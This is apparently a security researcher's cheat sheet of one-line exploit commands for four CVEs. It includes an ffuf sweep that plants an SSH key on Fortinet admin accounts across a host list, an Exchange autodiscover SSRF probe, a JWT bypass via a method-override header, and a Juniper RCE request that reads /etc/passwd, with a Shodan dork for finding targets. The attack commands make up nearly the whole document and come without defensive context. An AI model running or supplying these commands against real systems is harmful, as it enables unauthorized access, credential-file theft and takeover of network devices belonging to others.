
 ### CVE-2022-40684
##### @h4x0r_dz
```
 ffuf -w "host_list.txt:URL" -u "https://URL/api/v2/cmdb/system/admin/admin" -X PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by=”[127.0.0.1]:9000";' -d '{"ssh-public-key1": "h4x0r"}' -mr "SSH" -r
 ```

### CVE-2022-41040
##### @unknown
```
 ffuf -w "urllist.txt:URL" -u "https://URL/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL" -mr "IIS Web Core" -r
```
### bypasses JWT checking by using the X-HTTP-Method-Override request header!
##### CVE-2023-30845
```
 curl --request POST \
     --header "X-HTTP-Method-Override: PUT" \
     --header "Content-Type: application/json" \
     --data '{"username":"xyz"}' \
     https://my-endpoint.com/api
```
### CVE-2023-36845 - Juniper Firewalls RCE
##### Shodan Dork: title:"Juniper" http.favicon.hash:2141724739
```
curl <TARGET> -F $'auto_prepend_file="/etc/passwd\n"' -F 'PHPRC=/dev/fd/0'
```
